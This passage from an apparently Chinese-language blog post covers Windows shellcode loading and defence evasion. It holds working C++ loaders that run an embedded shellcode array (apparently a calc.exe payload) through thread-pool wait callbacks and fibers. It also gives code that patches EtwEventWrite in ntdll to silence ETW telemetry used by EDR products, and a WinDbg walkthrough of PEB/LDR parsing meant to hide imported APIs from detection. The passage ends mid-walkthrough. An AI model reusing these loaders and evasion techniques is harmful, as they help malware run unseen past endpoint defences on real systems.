class="string">&quot;\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b\x6f\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00&quot;</span>;</span><br><span class="line">	  <span class="comment">// 创建一个事件对象，初始状态为有信号（TRUE），手动重置（FALSE）。</span></span><br><span class="line">    HANDLE event = <span class="built_in">CreateEvent</span>(<span class="literal">NULL</span>, FALSE, TRUE, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 分配可执行和可写的内存空间以存储 shellcode。</span></span><br><span class="line">    LPVOID shellcodeAddress = <span class="built_in">VirtualAlloc</span>(<span class="literal">NULL</span>, <span class="built_in">sizeof</span>(buf), MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 将 shellcode 复制到分配的内存空间。</span></span><br><span class="line">    <span class="built_in">RtlMoveMemory</span>(shellcodeAddress, buf, <span class="built_in">sizeof</span>(buf));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 创建一个线程池等待对象，并将 shellcode 的地址作为回调函数。</span></span><br><span class="line">    PTP_WAIT threadPoolWait = <span class="built_in">CreateThreadpoolWait</span>((PTP_WAIT_CALLBACK)shellcodeAddress, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 将线程池等待对象与事件对象关联。</span></span><br><span class="line">    <span class="comment">// 一旦事件被触发（状态变为有信号），将执行 shellcode。</span></span><br><span class="line">    <span class="built_in">SetThreadpoolWait</span>(threadPoolWait, event, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 等待事件对象被触发。</span></span><br><span class="line">    <span class="comment">// 此时，shellcode 被设置为事件处理的回调函数，一旦事件被触发，shellcode 将执行。</span></span><br><span class="line">    <span class="built_in">WaitForSingleObject</span>(event, INFINITE);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="创建协程运行"><a href="#创建协程运行" class="headerlink" title="创建协程运行"></a>创建协程运行</h3><blockquote>
<p>协程（Coroutine）是一种轻量级的线程,也被称为纤程（Fiber）或微线程（Microthread）。</p>
<p>它们是 一种用户级别的线程，由程序自身管理，而不是由操作系统内核管理。纤程是一种可以提高程序执行效率的调度机制，特别适用于需要大量并发执行任务的场景</p>
</blockquote>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Wincrypt.h&gt;</span> <span class="comment">// 需要导入</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(lib, <span class="string">&quot;crypt32.lib&quot;</span>) <span class="comment">// 需要导入</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> buf[] = <span class="string">&quot;\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b\x6f\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00&quot;</span>;</span><br><span class="line">    <span class="comment">// 修改shellcode所在内存的保护属性为可读、可写、可执行</span></span><br><span class="line">    DWORD oldProtect;</span><br><span class="line">    <span class="built_in">VirtualProtect</span>((LPVOID)buf, <span class="built_in">sizeof</span>(buf), PAGE_EXECUTE_READWRITE, &amp;oldProtect);</span><br><span class="line">    <span class="comment">// 将当前线程转换为纤程（轻量级线程）</span></span><br><span class="line">    <span class="built_in">ConvertThreadToFiber</span>(<span class="literal">NULL</span>);    </span><br><span class="line">    <span class="comment">// 创建一个纤程对象，关联到shellcode作为纤程入口点，使用默认栈大小和无标志位</span></span><br><span class="line">    <span class="type">void</span>* shellcodeFiber = <span class="built_in">CreateFiber</span>(<span class="number">0</span>, (LPFIBER_START_ROUTINE)(LPVOID)buf, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="comment">// 切换到新创建的纤程，开始执行shellcode</span></span><br><span class="line">    <span class="built_in">SwitchToFiber</span>(shellcodeFiber);</span><br><span class="line">    <span class="comment">// shellcode执行完毕后，删除纤程对象</span></span><br><span class="line">    <span class="built_in">DeleteFiber</span>(shellcodeFiber);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="Patch-ETW"><a href="#Patch-ETW" class="headerlink" title="Patch ETW"></a>Patch ETW</h2><blockquote>
<p>Windows 事件跟踪 (ETW) 是⼀项内置功能，最初设计用于执行软件诊断，如今 ETW 被EDR厂商广泛使用.</p>
<p>对 ETW 的攻击会使依赖ETW遥测的⼀整类安全解决方案失效.<br>ETW指Windows事件追踪，是很多安全产品使用的windows功能。<br>其部分功能位于ntdll.dll中，可以修改内存中的etw相关函数达到禁止日志输出的效果，最常见的方法是<br>修改EtwEventWrite函数.</p>
</blockquote>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="type">void</span>* (*tNtVirtual)(</span><br><span class="line">    HANDLE ProcessHandle, </span><br><span class="line">    IN OUT PVOID* BaseAddress,</span><br><span class="line">    IN OUT PSIZE_T NumberOfBytesToProtect,</span><br><span class="line">    IN ULONG NewAccessProtection,</span><br><span class="line">    OUT PULONG OldAccessProtection</span><br><span class="line">);tNtVirtual oNtVirtual;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">patchETW</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> patch[] = &#123;<span class="number">0x48</span>, <span class="number">0x33</span>, <span class="number">0xc0</span>, <span class="number">0xc3</span>&#125;; <span class="comment">// xor rax, rax; ret</span></span><br><span class="line">    ULONG oldprotect = <span class="number">0</span>;</span><br><span class="line">    <span class="type">size_t</span> size = <span class="built_in">sizeof</span>(patch);</span><br><span class="line">    HANDLE hCurrentProc = <span class="built_in">GetCurrentProcess</span>();</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> sEtwEventWrite[] = &#123;<span class="string">&#x27;E&#x27;</span>,<span class="string">&#x27;t&#x27;</span>,<span class="string">&#x27;w&#x27;</span>,<span class="string">&#x27;E&#x27;</span>,<span class="string">&#x27;v&#x27;</span>,<span class="string">&#x27;e&#x27;</span>,<span class="string">&#x27;n&#x27;</span>,<span class="string">&#x27;t&#x27;</span>,<span class="string">&#x27;W&#x27;</span>,<span class="string">&#x27;r&#x27;</span>,<span class="string">&#x27;i&#x27;</span>,<span class="string">&#x27;t&#x27;</span>,<span class="string">&#x27;e&#x27;</span>,<span class="number">0x0</span>&#125;;</span><br><span class="line">    <span class="type">void</span>* pEventWrite = <span class="built_in">GetProcAddress</span>(<span class="built_in">GetModuleHandle</span>(<span class="string">L&quot;ntdll.dll&quot;</span>), (LPCSTR)sEtwEventWrite);</span><br><span class="line">    <span class="keyword">if</span> (pEventWrite == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;Error: Unable to get EtwEventWrite address&quot;</span> &lt;&lt; endl;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    	<span class="built_in">printf</span>(<span class="string">&quot;NTDLL.DLL START ADDRESS: %08x\n&quot;</span>, (DWORD)<span class="built_in">GetModuleHandle</span>(<span class="string">L&quot;ntdll.dll&quot;</span>));    </span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    FARPROC farProc = <span class="built_in">GetProcAddress</span>(<span class="built_in">GetModuleHandle</span>(<span class="string">L&quot;ntdll.dll&quot;</span>), <span class="string">&quot;NtProtectVirtualMemory&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (farProc == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;Error: Unable to get NtProtectVirtualMemory address&quot;</span> &lt;&lt; endl;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    	<span class="built_in">printf</span>(<span class="string">&quot;NtProtectVirtualMemory ADDRESS: %08x\n&quot;</span>, (DWORD)farProc);        </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    oNtVirtual = (tNtVirtual)farProc;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">oNtVirtual</span>(hCurrentProc, &amp;pEventWrite, (PSIZE_T)&amp;size, PAGE_READWRITE, &amp;oldprotect);</span><br><span class="line">    <span class="built_in">memcpy</span>(pEventWrite, patch, <span class="built_in">sizeof</span>(patch));</span><br><span class="line">    <span class="built_in">oNtVirtual</span>(hCurrentProc, &amp;pEventWrite, (PSIZE_T)&amp;size, oldprotect, &amp;oldprotect);</span><br><span class="line">    <span class="built_in">FlushInstructionCache</span>(hCurrentProc, pEventWrite, size);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">patchETW</span>();</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> ShellCode[] = <span class="string">&quot;&quot;</span>; <span class="comment">// Add your shellcode here</span></span><br><span class="line">    <span class="type">void</span>* exec = <span class="built_in">VirtualAlloc</span>(<span class="number">0</span>, <span class="built_in">sizeof</span>(ShellCode), MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class="line">    <span class="built_in">memcpy</span>(exec, ShellCode, <span class="built_in">sizeof</span>(ShellCode));</span><br><span class="line">    ((<span class="built_in">void</span>(*)())exec)();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="导入表隐藏"><a href="#导入表隐藏" class="headerlink" title="导入表隐藏"></a>导入表隐藏</h2><h3 id="什么是导入表"><a href="#什么是导入表" class="headerlink" title="什么是导入表"></a>什么是导入表</h3><blockquote>
<p><code>import Address Table</code> 在PE结构中,存在一个导入表,导入表中声明了这个PE文件会载入哪些模块,同时每个模块的结构中又会指向模块中的一些函数名称。</p>
<p>这样的组织关系是为了告诉操作系统这些函数的地址在哪里.方便修正调用地址.</p>
<p>由于导入函数就是被程序调用但其执行代码又不在程序中的函数,这些函数的代码位于一个或多个DLL中.</p>
<p>当PE文件被装入内存的时候,Windows装载器才将DLL装入,并调用导入函数的指令和函数实际所处的地址联系起来(动态连接),这操作就需要导入表完成.</p>
<p>其中导入地址表就指示函数实际地址.</p>
</blockquote>
<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/image-20241024180446165.png" data-fancybox="true"/></div></div>

<p>那如何隐藏这个函数呢?或者如何动态的调用这个函数而不直接使用此函数名称,那么就要使用动态调用API函数了.</p>
<p>它可以在运行时动态解析并获取API函数的地址。这样，敏感函数不会出现在导入表中，从而使得恶意代码更难被发现.</p>
<h3 id="实现思路"><a href="#实现思路" class="headerlink" title="实现思路"></a>实现思路</h3><ol>
<li>定位关键模块：首先找到包含核心API函数的关键模块（如<code>kernel32.dll</code>）。这通常可以通过解析<code>PEB（Process Environment Block）</code>中的模块列表来完成。 </li>
<li>获取API地址：可以通过<code>GetProcAddress</code>定位到<code>kernel32.dll</code>后，需要解析导出表（<code>Export Table</code>）以获取 <code>GetProcAddress</code>函数的地址。<code>GetProcAddress</code>是一个核心函数，用于在运行时动态解析其他API 函数的地址并且可以结合<code>LoadLibrary</code>函数获取任意模块的任意函数。</li>
<li>加载其他API：通过<code>GetProcAddress</code>函数，可以逐个获取其他需要的API函数的地址。例如，可以通过<code>GetProcAddress</code>获取<code>VirtualProtect</code>、<code>CreateThread</code>和<code>WaitForSingleObject</code>等函数的地址。 </li>
<li>准备<code>Shellcode</code>：将<code>Shellcode</code>存储在缓冲区中，使用<code>VirtualProtect</code>函数将缓冲区的内存页属性更改为可执行，以确保可以安全地执行<code>Shellcode</code></li>
</ol>
<h3 id="深度隐藏"><a href="#深度隐藏" class="headerlink" title="深度隐藏"></a>深度隐藏</h3><p>通过手动获取dll文件的方式，获取这两个函数的地址。<br>大致流程：</p>
<ol>
<li><p>找到kernel32.dll的地址</p>
</li>
<li><p>遍历kernel32.dll的导入表，找到GetProcAddress的地址</p>
</li>
<li><p>使用GetProcAddress获取LoadLibrary函数的地址</p>
</li>
<li><p>然后使用 LoadLibrary加载DLL文件</p>
</li>
<li><p>使用 GetProcAddress查找某个函数的地址</p>
</li>
</ol>
<h4 id="Windbg分析kernel32找基址"><a href="#Windbg分析kernel32找基址" class="headerlink" title="Windbg分析kernel32找基址"></a>Windbg分析kernel32找基址</h4><p>由于每个<code>windows</code>下的程序都会加载<code>kernel32.dll</code>，因此，找基址的过程是一样的.所以我们就用notepad.</p>
<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/image-20241115132713548.png" data-fancybox="true"/></div></div>

<h5 id="查找地址"><a href="#查找地址" class="headerlink" title="查找地址"></a>查找地址</h5><p>通过<code>r $peb</code>查看<code>peb</code>地址.获取到<code>peb</code>地址后，对<code>_PEB</code>结构体解析<code>dt _PEB 0000008e0d35b000</code></p>
<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/image-20241025085747559.png" data-fancybox="true"/></div></div>

<p>也可以通过<code>r $teb</code>查看<code>teb</code>地址.获取到<code>teb</code>地址后，对<code>_TEB</code>结构体解析<code>dt _TEB 0000008e0d364000</code></p>
<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/image-20241025085837498.png" data-fancybox="true"/></div></div>

<h5 id="解析LDR"><a href="#解析LDR" class="headerlink" title="解析LDR"></a>解析LDR</h5><p>既然<code>PEB</code>的地址找到了，就对<code>PEB</code>进行解析,首先找到<code>LDR</code></p>
<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/image-20241025085952570.png" data-fancybox="true"/></div></div>

<p>接下来，解析<code>LDR</code></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dt _PEB_LDR_DATA 0x00007ffea6976440</span><br></pre></td></tr></table></figure>

<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/image-20241025090018215.png" data-fancybox="true"/></div></div>

<p><code>_LIST_ENTRY</code>后面，怎么有两个值，是什么含义呢？加个-b，就看出来了</p>
<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/image-20241025090112432.png" data-fancybox="true"/></div></div>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">LIST_ENTRY</span> &#123;</span></span><br><span class="line">   <span class="class"><span class="keyword">struct</span> _<span class="title">LIST_ENTRY</span> *<span class="title">Flink</span>;</span></span><br><span class="line">   <span class="class"><span class="keyword">struct</span> _<span class="title">LIST_ENTRY</span> *<span class="title">Blink</span>;</span></span><br><span class="line">&#125; LIST_ENTRY, *PLIST_ENTRY, *RESTRICTED_POINTER PRLIST_ENTRY;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>双向链表是一种非常常见的数据结构，用于维护各种资源和对象的列表。<code>_LIST_ENTRY</code> 是一个基本的链表结构，包含两个指针：<code>Flink</code> 和 <code>Blink</code>，分别指向下一个和上一个链表条目。</p>
</blockquote>
<h5 id="解析InLoadOrderModuleList"><a href="#解析InLoadOrderModuleList" class="headerlink" title="解析InLoadOrderModuleList"></a>解析InLoadOrderModuleList</h5><p>我们选取<code>InLoadOrderModuleList</code>这个链.对它的<code>Flink</code>进行解析.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dt _LDR_DATA_TABLE_ENTRY 0x0000020ce3606190</span><br></pre></td></tr></table></figure>

<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/image-20241025090412454.png" data-fancybox="true"/></div></div>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// _LDR_DATA_TABLE_ENTRY结构体解释</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">LDR_DATA_TABLE_ENTRY</span> &#123;</span></span><br><span class="line">    LIST_ENTRY InLoadOrderLinks;          <span class="comment">// 链接模块在加载顺序中的位置</span></span><br><span class="line">    LIST_ENTRY InMemoryOrderLinks;        <span class="comment">// 链接模块在内存顺序中的位置</span></span><br><span class="line">    LIST_ENTRY InInitializationOrderLinks;<span class="comment">// 链接模块在初始化顺序中的位置</span></span><br><span class="line">    PVOID DllBase;                        <span class="comment">// 模块在内存中的基址</span></span><br><span class="line">    PVOID EntryPoint;                     <span class="comment">// 模块的入口点地址</span></span><br><span class="line">    ULONG SizeOfImage;                    <span class="comment">// 模块的映像大小</span></span><br><span class="line">    UNICODE_STRING FullDllName;           <span class="comment">// 模块的完整路径</span></span><br><span class="line">    UNICODE_STRING BaseDllName;           <span class="comment">// 模块的基本名称</span></span><br><span class="line">    ULONG Flags;                          <span class="comment">// 模块状态和属性的标志位</span></span><br><span class="line">    WORD ObsoleteLoadCount;               <span class="comment">// 旧版本的加载计数</span></span><br><span class="line">    WORD TlsIndex;                        <span class="comment">// 线程局部存储索引</span></span><br><span class="line">    LIST_ENTRY HashLinks;                 <span class="comment">// 哈希表中的链接</span></span><br><span class="line">    ULONG TimeDateStamp;                  <span class="comment">// 模块编译的时间戳</span></span><br><span class="line">    PVOID EntryPointActivationContext;    <span class="comment">// 入口点的激活上下文</span></span><br><span class="line">    PVOID Lock;                           <span class="comment">// 模块加载时的锁</span></span><br><span class="line">    PVOID DdagNode;                       <span class="comment">// 依赖关系图的节点指针</span></span><br><span class="line">    LIST_ENTRY NodeModuleLink;            <span class="comment">// 依赖关系图中的链接</span></span><br><span class="line">    PVOID LoadContext;                    <span class="comment">// 加载时的上下文</span></span><br><span class="line">    PVOID ParentDllBase;                  <span class="comment">// 父模块的基址</span></span><br><span class="line">    PVOID SwitchBackContext;              <span class="comment">// 切换回的上下文</span></span><br><span class="line">    RTL_BALANCED_NODE BaseAddressIndexNode; <span class="comment">// 平衡树节点</span></span><br><span class="line">    RTL_BALANCED_NODE MappingInfoIndexNode; <span class="comment">// 映射信息节点</span></span><br><span class="line">    ULONG OriginalBase;                   <span class="comment">// 原始基址</span></span><br><span class="line">    LARGE_INTEGER LoadTime;               <span class="comment">// 加载时间</span></span><br><span class="line">    ULONG BaseNameHashValue;              <span class="comment">// 基本名称的哈希值</span></span><br><span class="line">    ULONG LoadReason;                     <span class="comment">// 模块加载的原因</span></span><br><span class="line">    ULONG ImplicitPathOptions;            <span class="comment">// 隐式路径选项</span></span><br><span class="line">    ULONG ReferenceCount;                 <span class="comment">// 模块的引用计数</span></span><br><span class="line">    ULONG DependentLoadFlags;             <span class="comment">// 依赖加载标志</span></span><br><span class="line">    UCHAR SigningLevel;                   <span class="comment">// 签名级别</span></span><br><span class="line">    ULONG CheckSum;                       <span class="comment">// 模块的校验和</span></span><br><span class="line">    PVOID ActivePatchImageBase;           <span class="comment">// 活动补丁的基址</span></span><br><span class="line">    ULONG HotPatchState;                  <span class="comment">// 热补丁的状态</span></span><br><span class="line">&#125; LDR_DATA_TABLE_ENTRY;</span><br></pre></td></tr></table></figure>

<p>继续遍历<code>InLoadOrderLinks</code>的<code>Flink</code>字段：</p>
